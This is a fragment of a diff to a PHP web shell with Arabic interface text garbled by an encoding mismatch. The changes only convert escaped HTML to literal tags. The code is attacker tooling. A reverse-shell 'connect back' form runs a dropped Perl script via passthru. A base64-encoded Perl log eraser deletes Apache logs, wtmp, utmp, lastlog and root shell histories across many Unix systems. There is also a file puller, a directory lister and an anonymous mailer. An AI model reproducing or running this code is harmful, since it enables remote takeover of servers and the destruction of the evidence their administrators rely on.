-    echo "&lt;tr&gt;&lt;td&gt;&lt;center&gt;&lt;font size='1' face='tahoma'&gt;  Êã ÓÍÈ ÇáãáÝ ÈäÌÇÍ  &lt;font color=#FF0000&gt; ========&gt; &lt;/font&gt; $get&lt;/font&gt;&lt;br&gt;&lt;textarea rows='20' cols='80' name='source'&gt;$source&lt;/textarea&gt;";
+    echo "<tr><td><center><font size='1' face='tahoma'>  Êã ÓÍÈ ÇáãáÝ ÈäÌÇÍ  <font color=#FF0000> ========> </font> $get</font><br><textarea rows='20' cols='80' name='source'>$source</textarea>";
     unlink($tempp);
     } else {
-    echo "&lt;tr&gt;&lt;td&gt;&lt;center&gt;&lt;font size='3' color='red' face='tahoma'&gt;áã íÊã ÓÍÈ ÇáãáÝ&lt;/font&gt;";
+    echo "<tr><td><center><font size='3' color='red' face='tahoma'>áã íÊã ÓÍÈ ÇáãáÝ</font>";
             }
    
 }
@@ -1097,14 +1097,14 @@ if(isset($_POST['redfi']))
 // ÓÍÈ ãÌáÏ
 if(isset($_POST['reddi'])){
    
-echo "&lt;br&gt;";
+echo "<br>";
 $dirzz = $_POST['directory'];
 $filepp = glob("$dirzz*");
 
 foreach ($filepp as $filenamep) {
-    echo "&lt;tr&gt;&lt;td&gt;&lt;font size='1' face='Verdana'&gt;";
+    echo "<tr><td><font size='1' face='Verdana'>";
    echo "$filenamep\n";
-   echo "&lt;/font&gt;&lt;br&gt;";
+   echo "</font><br>";
 }
 }
 
@@ -1113,27 +1113,27 @@ foreach ($filepp as $filenamep) {
 if(isset($_POST['connectback']))
 {
 echo "
-&lt;tr&gt;&lt;td&gt;
-&lt;center&gt;&lt;font size='2' face='tahoma'&gt;&lt;b&gt;ÇáÅÊÕÇá ÇáÚßÓí&lt;/b&gt;&lt;br&gt;&lt;/font&gt;
-&lt;form method='post' action=''&gt;&lt;input type='text' name='connhost' size='15'value='" . $_SERVER['REMOTE_ADDR'] ."'&gt; &lt;input type='text' name='connport' size='5' value='443'&gt; &lt;input type='submit' name='connsub' value='äÝÐ'&gt;&lt;/form&gt;";
+<tr><td>
+<center><font size='2' face='tahoma'><b>ÇáÅÊÕÇá ÇáÚßÓí</b><br></font>
+<form method='post' action=''><input type='text' name='connhost' size='15'value='" . $_SERVER['REMOTE_ADDR'] ."'> <input type='text' name='connport' size='5' value='443'> <input type='submit' name='connsub' value='äÝÐ'></form>";
 }
 if(isset($_POST['logeraser']))
 {
-echo "&lt;tr&gt;&lt;td&gt;
-&lt;center&gt;&lt;b&gt;&lt;font size='2' face='tahoma'&gt;ÃÎÊÑ äæÚ ÇáÓíÑÝÑ&lt;br&gt;&lt;/font&gt;&lt;/b&gt;
-        &lt;select name=functionp&gt;
-          &lt;option&gt;linux&lt;/option&gt;
-          &lt;option&gt;sunos&lt;/option&gt;
-          &lt;option&gt;aix&lt;/option&gt;
-          &lt;option&gt;irix&lt;/option&gt;
-          &lt;option&gt;openbsd&lt;/option&gt;
-          &lt;option&gt;solaris&lt;/option&gt;
-          &lt;option&gt;suse&lt;/option&gt;
-          &lt;option&gt;lampp&lt;/option&gt;
-          &lt;option&gt;debian&lt;/option&gt;
-          &lt;option&gt;freebsd&lt;/option&gt;
-          &lt;option&gt;misc&lt;/option&gt;
-        &lt;/select&gt;&lt;br&gt;&lt;input type='submit' name='runer' value='ãÓÍ'&gt;&lt;/table&gt;";
+echo "<tr><td>
+<center><b><font size='2' face='tahoma'>ÃÎÊÑ äæÚ ÇáÓíÑÝÑ<br></font></b>
+        <select name=functionp>
+          <option>linux</option>
+          <option>sunos</option>
+          <option>aix</option>
+          <option>irix</option>
+          <option>openbsd</option>
+          <option>solaris</option>
+          <option>suse</option>
+          <option>lampp</option>
+          <option>debian</option>
+          <option>freebsd</option>
+          <option>misc</option>
+        </select><br><input type='submit' name='runer' value='ãÓÍ'></table>";
         }
        
 // ÇáÅÊÕÇá ÇáÚßÓí
@@ -1146,40 +1146,40 @@ fclose($openz);
 $aids = passthru("perl cbs.pl ".$_POST['connhost']." ".$_POST['connport']);
 unlink("cbs.pl");
 }
-if(isset($_POST['connsub'])) { echo "&lt;tr&gt;&lt;td&gt;&lt;p align=center&gt;&lt;font color='lightgreen' face='Tahoma' size='5'&gt;Êã ÇáÃÊÕÇá íäÌÇÍ&lt;/font&gt;&lt;/p&gt;"; }
+if(isset($_POST['connsub'])) { echo "<tr><td><p align=center><font color='lightgreen' face='Tahoma' size='5'>Êã ÇáÃÊÕÇá íäÌÇÍ</font></p>"; }
 
         // ãÓÍ ÇáÃËÑ
 if(isset($_POST['runer']))
 {
-echo "&lt;tr&gt;&lt;td&gt;&lt;center&gt;&lt;textarea cols='30' rows='2'&gt;";
+echo "<tr><td><center><textarea cols='30' rows='2'>";
 $erase = base64_decode("IyF1c3IvYmluL3BlcmwKIyBQb3dlcmVkIEJ5IElsbHV6MW9uCiMgTW9kZGVkIGJ5IENvZDNyWiBmb3IgQ29kM3JaIFNoZWxsCiAgICAgICBjaG9tcCgkb3MgPSAkQVJHVlswXSk7CgogICAgICAgICAgICAgICAgaWYoJG9zIGVxICJtaXNjIil7ICNJZiBtaXNjIHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cwogICAgICAgICAgICAgcHJpbnQgIlsrXW1pc2MgU2VsZWN0ZWQuLi5cbiI7ICAgCiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgcHJpbnQgIjx0cj5bK11Mb2dzIExvY2F0ZWQuLi5cbiI7CiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgJGEgPSB1bmxpbmsgQG1pc2M7ICAgCiAgICAgICAgICAgICBzbGVlcCAxOwoJCQkgCiAgICAgICAgICAgIGlmKCRhKSB7IHByaW50ICJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXG4iOyB9CgkJCWVsc2UgeyBwcmludCAiWy1dRXJyb3IiOyB9CiAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKCRvcyBlcSAib3BlbmJzZCIpeyAjSWYgb3BlbmJzZCB0eXBlZCwgZG8gdGhlIGZvbGxvd2luZyBhbmQgc3RhcnQgYnJhY2tldHMKICAgICAgICAgICAgIHByaW50ICJbK11vcGVuYnNkIFNlbGVjdGVkLi4uXG4iOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgIHByaW50ICJbK11Mb2dzIExvY2F0ZWQuLi5cbiI7ICAgCiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgJGIgPSB1bmxpbmsgQG9wZW5ic2Q7ICAgCiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICBpZigkYikge3ByaW50ICJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXG4iOyAgIH0KCQkJZWxzZSB7IHByaW50ICJbLV1FcnJvciI7IH0KICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJG9zIGVxICJmcmVlYnNkIil7ICNJZiBmcmVlYnNkIHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cwogICAgICAgICAgICAgcHJpbnQgIlsrXWZyZWVic2QgU2VsZWN0ZWQuLi5cbiI7ICAgCiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgcHJpbnQgIlsrXUxvZ3MgTG9jYXRlZC4uLlxuIjsgICAKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICAkYyA9IHVubGluayBAZnJlZWJzZDsgICAKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICBpZigkYykgeyBwcmludCAiWytdTG9ncyBTdWNjZXNzZnVsbHkgRGVsZXRlZC4uLlxuIjsgfQoJCQkgZWxzZSB7IHByaW50ICJbLV1FcnJvciI7IH0KICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJG9zIGVxICJkZWJpYW4iKXsgI0lmIERlYmlhbiB0eXBlZCwgZG8gdGhlIGZvbGxvd2luZyBhbmQgc3RhcnQgYnJhY2tldHMKICAgICAgICAgICAgIHByaW50ICJbK11kZWJpYW4gU2VsZWN0ZWQuLi5cbiI7CiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgcHJpbnQgIlsrXUxvZ3MgTG9jYXRlZC4uLlxuIjsKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICAkZCA9IHVubGluayBAZGViaWFuOyAgIAogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgIGlmKCRkKSB7IHByaW50ICJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXG4iOyB9CgkJCSAgZWxzZSB7IHByaW50ICJbLV1FcnJvciI7IH0KICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJG9zIGVxICJzdXNlIil7ICNJZiBzdXNlIHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cwogICAgICAgICAgICAgcHJpbnQgIlsrXXN1c2UgU2VsZWN0ZWQuLi5cbiI7CiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgcHJpbnQgIlsrXUxvZ3MgTG9jYXRlZC4uLlxuIjsKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICAkZSA9IHVubGluayBAc3VzZTsgICAKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgIGlmKCRlKSB7IHByaW50ICJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXG4iOyB9CgkJCSBlbHNlIHsgcHJpbnQgIlstXUVycm9yIjsgfQogICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZigkb3MgZXEgInNvbGFyaXMiKXsgI0lmIHNvbGFyaXMgdHlwZWQsIGRvIHRoZSBmb2xsb3dpbmcgYW5kIHN0YXJ0IGJyYWNrZXRzCiAgICAgICAgICAgICBwcmludCAiWytdc29sYXJpcyBTZWxlY3RlZC4uLlxuIjsKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICBwcmludCAiWytdTG9ncyBMb2NhdGVkLi4uXG4iOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgICRmID0gdW5saW5rIEBzb2xhcmlzOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgIGlmKCRmKSB7cHJpbnQgIlsrXUxvZ3MgU3VjY2Vzc2Z1bGx5IERlbGV0ZWQuLi5cbiI7IH0KCQkJIGVsc2UgeyBwcmludCAiWy1dRXJyb3IiOyB9CiAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKCRvcyBlcSAibGFtcHAiKXsgI0lmIGxhbXBwIHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cwogICAgICAgICAgICAgcHJpbnQgIlsrXUxhbXBwIFNlbGVjdGVkLi4uXG4iOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgIHByaW50ICJbK11Mb2dzIExvY2F0ZWQuLi5cbiI7CiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgJGcgPSB1bmxpbmsgQGxhbXBwOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgaWYoJGcpIHsgcHJpbnQgIlsrXUxvZ3MgU3VjY2Vzc2Z1bGx5IERlbGV0ZWQuLi5cbiI7IH0KCQkgICAgZWxzZSB7IHByaW50ICJbLV1FcnJvciI7IH0KICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJG9zIGVxICJyZWRoYXQiKXsgI0lmIHJlZGhhdCB0eXBlZCwgZG8gdGhlIGZvbGxvd2luZyBhbmQgc3RhcnQgYnJhY2tldHMKICAgICAgICAgICAgIHByaW50ICJbK11SZWQgSGF0IExpbnV4L01hYyBPUyBYIFNlbGVjdGVkLi4uXG4iOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgIHByaW50ICJbK11Mb2dzIExvY2F0ZWQuLi5cbiI7CiAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgJGggPSB1bmxpbmsgQHJlZGhhdDsKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICBpZigkaCkgeyBwcmludCAiWytdTG9ncyBTdWNjZXNzZnVsbHkgRGVsZXRlZC4uLlxuIjsgfQoJCQkgIGVsc2UgeyBwcmludCAiWy1dRXJyb3IiOyB9CiAgICAgICAgICAgICAgfQogICAgICAgCiAgICAgICAgICAgICAgICBpZigkb3MgZXEgImxpbnV4Iil7ICNJZiBsaW51eCB0eXBlZCwgZG8gdGhlIGZvbGxvd2luZyBhbmQgc3RhcnQgYnJhY2tldHMKICAgICAgICAgICAgIHByaW50ICJbK11MaW51eCBTZWxlY3RlZC4uLlxuIjsgICAKICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICBwcmludCAiWytdTG9ncyBMb2NhdGVkLi4uXG4iOwogICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgICRpID0gdW5saW5rIEBsaW51eDsKICAgICAgICAgICAgIHNsZWVwIDE7CgkJCWlmKCRpKSB7IHByaW50ICJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXG4iO30gCgkJCWVsc2UgeyBwcmludCAiWy1dRXJyb3IiOyB9CgkJfSAgICAgIAogICAgICAgICAgICAgCiAgICAgICAgICAgICAgaWYoJG9zIGVxICJzdW5vcyIpeyAjSWYgc3Vub3MgdHlwZWQsIGRvIHRoZSBmb2xsb3dpbmcgYW5kIHN0YXJ0IGJyYWNrZXRzCiAgICAgICAgICAgICAgcHJpbnQgIlsrXVN1bk9TIFNlbGVjdGVkLi4uXG4iOwogICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICAgcHJpbnQgIlsrXUxvZ3MgTG9jYXRlZC4uLlxuIjsKICAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgICRsID0gdW5saW5rIEBzdW5vczsKICAgICAgICAgICAgICBpZigkbCkgeyBwcmludCAiWytdTG9ncyBTdWNjZXNzZnVsbHkgRGVsZXRlZC4uLlxuIjsgfQoJCQkgIGVsc2UgeyBwcmludCAiWy1dRXJyb3IiOyB9CiAgICAgICAgICAgICAgfSAgIAogICAgICAgICAgICAgICAKICAgICAgICAgICAgICBpZigkb3MgZXEgImFpeCIpeyAjSWYgYWl4IHR5cGVkLCBkbyB0aGUgZm9sbG93aW5nIGFuZCBzdGFydCBicmFja2V0cwogICAgICAgICAgICAgICAgIHByaW50ICJbK11BaXggU2VsZWN0ZWQuLi5cbiI7CiAgICAgICAgICAgICAgICAgc2xlZXAgMTsKICAgICAgICAgICAgICBwcmludCAiWytdTG9ncyBMb2NhdGVkLi4uXG4iOwogICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICAgJG0gPSB1bmxpbmsgQGFpeDsKICAgICAgICAgICAgICBpZigkbSkgeyBwcmludCAiWytdTG9ncyBTdWNjZXNzZnVsbHkgRGVsZXRlZC4uLlxuIjsgfQoJCQkgICBlbHNlIHsgcHJpbnQgIlstXUVycm9yIjsgfQogICAgICAgICAgICAgIH0KICAgICAgICAgICAgIAogICAgICAgICAgICAgIGlmKCRvcyBlcSAiaXJpeCIpeyAjSWYgaXJpeCB0eXBlZCwgZG8gdGhlIGZvbGxvd2luZyBhbmQgc3RhcnQgYnJhY2tldAogICAgICAgICAgICAgIHByaW50ICJbK11Jcml4IFNlbGVjdGVkLi4uXG4iOwogICAgICAgICAgICAgIHNsZWVwIDE7CiAgICAgICAgICAgICAgcHJpbnQgIlsrXUxvZ3MgTG9jYXRlZC4uLlxuIjsKICAgICAgICAgICAgICBzbGVlcCAxOwogICAgICAgICAgICAgICRuID0gdW5saW5rIEBpcml4OyAgIAogICAgICAgICAgICAgIGlmKCRuKSB7IHByaW50ICJbK11Mb2dzIFN1Y2Nlc3NmdWxseSBEZWxldGVkLi4uXG4iOyB9CgkJCSAgZWxzZSB7IHByaW50ICJbLV1FcnJvciI7IH0KICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNNaXNjIExvZyBMb2NhdGlvbnMgICAKICAgICAgeyAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgIEBtaXNjID0gKCIvZXRjL2h0dHBkL2xvZ3MvYWNjZXNzLmxvZyIsICIvZXRjL2h0dHBkL2xvZ3MvZXJyb3IubG9nIiwiL2V0Yy9odHRwZC9sb2dzL2FjY2Vzc19sb2ciLAogICAgICAgICAgICAiL2V0Yy9odHRwZC9sb2dzL2Vycm9yX2xvZyIsIi91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvYWNjZXNzX2xvZyIsIi91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvZXJyb3JfbG9nIiwKICAgICAgICAgICAgIi91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvYWNjZXNzLmxvZyIsIi91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvZXJyb3IubG9nIiwiL3Zhci9sb2cvYXBhY2hlL2FjY2Vzc19sb2ciLAogICAgICAgICAgICAiL3Zhci9sb2cvYXBhY2hlL2Vycm9yX2xvZyIsIi92YXIvbG9nL2FwYWNoZS9hY2Nlc3MubG9nIiwiL3Zhci9sb2cvYXBhY2hlL2Vycm9yLmxvZyIsIi92YXIvbG9nL2FjY2Vzc19sb2ciLAogICAgICAgICAgICAiL3Zhci9sb2cvZXJyb3JfbG9nIiwiL3Zhci93d3cvbG9ncy9lcnJvci5sb2ciLCIvdmFyL3d3dy9sb2dzL2FjY2Vzcy5sb2ciLCIvdmFyL3d3dy9sb2dzL2Vycm9yX2xvZyIsCiAgICAgICAgICAgICIvdmFyL3d3dy9sb2dzL2FjY2Vzc19sb2ciKQogICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjTG9ncyBvZiBPcGVuQlNEIFN5c3RlbXMKICAgCiAgICAgIHsKICAgICAgIEBvcGVuYnNkID0gKCIvdmFyL3d3dy9sb2cvYWNjZXNzX2xvZyIsICIvdmFyL3d3dy9sb2cvZXJyb3JfbG9nIikKICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjTG9ncyBvZiBGcmVlQlNEIFN5c3RlbXMKICAgCiAgICAgIHsKICAgICAgIEBmcmVlYnNkID0gKCIvdXNyL2xvY2FsL2V0Yy9odHRwZC9sb2dzL2FjY2Vzc19sb2ciLCAiL3Vzci9sb2NhbC9ldGMvaHR0cGQvbG9ncy9lcnJvcl9sb2ciKQogICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNMb2dzIG9mIERlYmlhbiBTeXN0ZW1zCiAgIAogICAgICB7CiAgICAgICBAZGViaWFuID0gKCIvdmFyL2xvZy9hcGFjaGUvYWNjZXNzLmxvZyIsICIvdmFyL2xvZy9hcGFjaGUvZXJyb3IubG9nIiwKICAgICAgICIvdmFyL2xvZy9hcGFjaGUtc3NsL2Vycm9yLmxvZyIsICIvdmFyL2xvZy9hcGFjaGUtc3NsL2FjY2Vzcy5sb2ciKQogICAgICAgICAgIH0gICAKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNMb2dzIG9mIFN1U0UgTGludXggU3lzdGVtcwogICAKICAgICAgewogICAgICAgQHN1c2UgPSAoIi92YXIvbG9nL2h0dHBkL2FjY2Vzc19sb2ciLCAiL3Zhci9sb2cvaHR0cGQvZXJyb3JfbG9nIikKICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjTG9ncyBvZiBTb2xhcmlzIFN5c3RlbXMKICAgCiAgICAgIHsgICAKICAgICAgIEBzb2xhcmlzID0gKCIvdmFyL2FwYWNoZS9sb2dzL2FjY2Vzc19sb2ciLCAiL3Zhci9hcGFjaGUvbG9ncy9lcnJvcl9sb2ciKQogICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNMb2dzIG9mIExhbXBwIFN5c3RlbXMKICAgCiAgICAgIHsKICAgICAgIEBsYW1wcCA9ICgiL29wdC9sYW1wcC9sb2dzL2Vycm9yX2xvZyIsICIvb3B0L2xhbXBwL2xvZ3MvYWNjZXNzX2xvZyIpCiAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI0xvZ3Mgb2YgUmVkIEhhdCwgTWFjIE9TIFggU3lzdGVtcwogICAKICAgICAgewogICAgICAgQHJlZGhhdCA9ICgiL3Zhci9sb2cvaHR0cGQvYWNjZXNzX2xvZyIsICIvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2ciKQogICAgICAgICAgIH0KICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNMb2dzIG9mIElyaXggU3lzdGVtcwogICAKICAgICAgewogICAgICAgQGlyaXggPSAoIi92YXIvYWRtL1NZU0xPRyIsICIvdmFyL2FkbS9zdWxvZyIsICIvdmFyL2FkbS91dG1wIiwgIi92YXIvYWRtL3V0bXB4IiwKICAgICAgICAgICAgICAiL3Zhci9hZG0vd3RtcCIsICIvdmFyL2FkbS93dG1weCIsICIvdmFyL2FkbS9sYXN0bG9nLyIsCiAgICAgICAgICAgICIvdXNyL3Nwb29sL2xwL2xvZyIsICIvdmFyL2FkbS9scC9scC1lcnJzIiwgIi91c3IvbGliL2Nyb24vbG9nIiwKICAgICAgICAgICAgIi92YXIvYWRtL2xvZ2lubG9nIiwgIi92YXIvYWRtL3BhY2N0IiwgIi92YXIvYWRtL2R0bXAiLAogICAgICAgICAgICAiL3Zhci9hZG0vYWNjdC9zdW0vbG9naW5sb2ciLCAidmFyL2FkbS9YMG1zZ3MiLCAiL3Zhci9hZG0vY3Jhc2gvdm1jb3JlIiwKICAgICAgICAgICAgIi92YXIvYWRtL2NyYXNoL3VuaXgiKQogICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI0xvZyBzb2YgQWl4IFN5c3RlbXMKICAgICAgeyAgIAogICAgICBAYWl4ID0gKCIvdmFyL2FkbS9wYWNjdCIsICIvdmFyL2FkbS93dG1wIiwgIi92YXIvYWRtL2R0bXAiLCAiL3Zhci9hZG0vcWFjY3QiLCAgIAogICAgICAgICAgICAgICAiL3Zhci9hZG0vc3Vsb2ciLCAiL3Zhci9hZG0vcmFzL2VycmxvZyIsICIvdmFyL2FkbS9yYXMvYm9vdGxvZyIsCiAgICAgICAgICAgICAgICIvdmFyL2FkbS9jcm9uL2xvZyIsICIvZXRjL3V0bXAiLCAiL2V0Yy9zZWN1cml0eS9sYXN0bG9nIiwKICAgICAgICAgICAgICAgIi9ldGMvc2VjdXJpdHkvZmFpbGVkbG9naW4iLCAidXNyL3Nwb29sL21xdWV1ZS9zeXNsb2ciKSAgIAogICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNMb2dzIG9mIFN1bk9TIFN5c3RlbXMgICAKICAgICAgeyAgICAgICAgICAgICAgICAgICAgIAogICAgICBAc3Vub3MgPSAoIi92YXIvYWRtL21lc3NhZ2VzIiwgIi92YXIvYWRtL2FjdWxvZ3MiLCAiL3Zhci9hZG0vYWN1bG9nIiwKICAgICAgICAgICAgICAgICAiL3Zhci9hZG0vc3Vsb2ciLCAiL3Zhci9hZG0vdm9sZC5sb2ciLCAiL3Zhci9hZG0vd3RtcCIsCiAgICAgICAgICAgICAgICAgIi92YXIvYWRtL3d0bXB4IiwgIi92YXIvYWRtL3V0bXAiLCAiL3Zhci9hZG0vdXRtcHgiLAogICAgICAgICAgICAgICAgICIvdmFyL2FkbS9sb2cvYXNwcHAubG9nIiwgIi92YXIvbG9nL3N5c2xvZyIsCiAgICAgICAgICAgICAgICAgIi92YXIvbG9nL1BPUGxvZyIsICIvdmFyL2xvZy9hdXRobG9nIiwgIi92YXIvYWRtL3BhY2N0IiwKICAgICAgICAgICAgICAgICAiL3Zhci9scC9sb2dzL2xwc2NoZWQiLCAiL3Zhci9scC9sb2dzL3JlcXVlc3RzIiwKICAgICAgICAgICAgICAiL3Zhci9jcm9uL2xvZ3MiLCAiL3Zhci9zYWYvX2xvZyIsICIvdmFyL3NhZi9wb3J0L2xvZyIpCiAgICAgICAgIH0gICAgIAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjTG9ncyBvZiBMaW51eCBTeXN0ZW1zICAgICAgIAogICAgICB7ICAgICAKICAgICAgIEBsaW51eCA9ICgiL3Zhci9sb2cvbGFzdGxvZyIsICIvdmFyL2xvZy90ZWxuZXRkIiwgIi92YXIvcnVuL3V0bXAiLAogICAgICAgICAgICAgICAgICIvdmFyL2xvZy9zZWN1cmUiLCIvcm9vdC8ua3NoX2hpc3RvcnkiLCAiL3Jvb3QvLmJhc2hfaGlzdG9yeSIsCiAgICAgICAgICAgICAgICAgIi9yb290Ly5iYXNoX2xvZ3V0IiwgIi92YXIvbG9nL3d0bXAiLCAiL2V0Yy93dG1wIiwKICAgICAgICAgICAgICAgICAiL3Zhci9ydW4vdXRtcCIsICIvZXRjL3V0bXAiLCAiL3Zhci9sb2ciLCAiL3Zhci9hZG0iLAogICAgICAgICAgICAgICAgICIvdmFyL2FwYWNoZS9sb2ciLCAiL3Zhci9hcGFjaGUvbG9ncyIsICIvdXNyL2xvY2FsL2FwYWNoZS9sb2dzIiwKICAgICAgICAgICAgICAgICAiL3Vzci9sb2NhbC9hcGFjaGUvbG9ncyIsICIvdmFyL2xvZy9hY2N0IiwgIi92YXIvbG9nL3hmZXJsb2ciLAogICAgICAgICAgICAgICAgICIvdmFyL2xvZy9tZXNzYWdlcy8iLCAiL3Zhci9sb2cvcHJvZnRwZC94ZmVybG9nLmxlZ2FjeSIsCiAgICAgICAgICAgICAgICAgIi92YXIvbG9nL3Byb2Z0cGQueGZlcmxvZyIsICIvdmFyL2xvZy9wcm9mdHBkLmFjY2Vzc19sb2ciLAogICAgICAgICAgICAgICAgICIvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2ciLCAiL3Zhci9sb2cvaHR0cHNkL3NzbF9sb2ciLAogICAgICAgICAgICAgICAgICIvdmFyL2xvZy9odHRwc2Qvc3NsLmFjY2Vzc19sb2ciLCAiL2V0Yy9tYWlsL2FjY2VzcyIsCiAgICAgICAgICAgICAgICAgIi92YXIvbG9nL3FtYWlsIiwgIi92YXIvbG9nL3NtdHBkIiwgIi92YXIvbG9nL3NhbWJhIiwKICAgICAgICAgICAgICAgICAiL3Zhci9sb2cvc2FtYmEubG9nLiVtIiwgIi92YXIvbG9jay9zYW1iYSIsICIvcm9vdC8uWGF1dGhvcml0eSIsCiAgICAgICAgICAgICAgICAgIi92YXIvbG9nL3BvcGxvZyIsICIvdmFyL2xvZy9uZXdzLmFsbCIsICIvdmFyL2xvZy9zcG9vbGVyIiwKICAgICAgICAgICAgICAgICAiL3Zhci9sb2cvbmV3cyIsICIvdmFyL2xvZy9uZXdzL25ld3MiLCAiL3Zhci9sb2cvbmV3cy9uZXdzLmFsbCIsCiAgICAgICAgICAgICAgICAgIi92YXIvbG9nL25ld3MvbmV3cy5jcml0IiwgIi92YXIvbG9nL25ld3MvbmV3cy5lcnIiLCAiL3Zhci9sb2cvbmV3cy9uZXdzLm5vdGljZSIsCiAgICAgICAgICAgICAgICAgIi92YXIvbG9nL25ld3Mvc3Vjay5lcnIiLCAiL3Zhci9sb2cvbmV3cy9zdWNrLm5vdGljZSIsCiAgICAgICAgICAgICAgICAgIi92YXIvc3Bvb2wvdG1wIiwgIi92YXIvc3Bvb2wvZXJyb3JzIiwgIi92YXIvc3Bvb2wvbG9ncyIsICIvdmFyL3Nwb29sL2xvY2tzIiwKICAgICAgICAgICAgICAgICAiL3Vzci9sb2NhbC93d3cvbG9ncy90aHR0cGRfbG9nIiwgIi92YXIvbG9nL3RodHRwZF9sb2ciLAogICAgICAgICAgICAgICAgICIvdmFyL2xvZy9uY2Z0cGQvbWlzY2xvZy50eHQiLCAiL3Zhci9sb2cvbmN0ZnBkLmVycnMiLAogICAgICAgICAgICAgICAgICIvdmFyL2xvZy9hdXRoIikKICAgICAgICAgfQogICAgICAgICAKICAgICAgCiAKICAg");
 $openp = fopen("logseraser.pl", "w+")or die("Error");
 fwrite($openp, $erase)or die("Error");
 fclose($openp);
 $aidx = passthru("perl logseraser.pl ".$_POST['functionp']);
 unlink("logseraser.pl");
-echo "&lt;/textarea&gt;";
+echo "</textarea>";
 }
 elseif(isset($_POST['mail']))
 {
-echo "&lt;form method='post' action=''&gt;
-&lt;td valign=top&gt;&lt;center&gt;&lt;font face='Verdana' size='2'&gt;(html) ÇáÑÓÇáÉ áÜ ÇáÅíãíá íÏÚã áÛÉ åÊãá&lt;/font&gt;&lt;/center&gt;
-&lt;center&gt;&lt;font face='Verdana' size='1'&gt;Çáì:&lt;br&gt;
-&lt;input type='text' size='19' name='mto'&gt;&lt;br&gt;
-Çáì:&lt;br&gt;
-&lt;input type='text' size='19' name='mfrom'&gt;&lt;br&gt;
-ÇáãæÖæÚ:&lt;br&gt;
-&lt;input type='text' size='19' name='mobj'&gt;&lt;br&gt;
-ÇáãÍÊæì:&lt;br&gt;
-&lt;textarea name='mtext' cols=20 rows=4&gt;&lt;/textarea&gt;&lt;br&gt;
-&lt;br&gt;&lt;input type='submit' value='ÅÑÓá' name='senm'&gt;
-&lt;/form&gt;&lt;/table&gt;&lt;br&gt;";}
+echo "<form method='post' action=''>
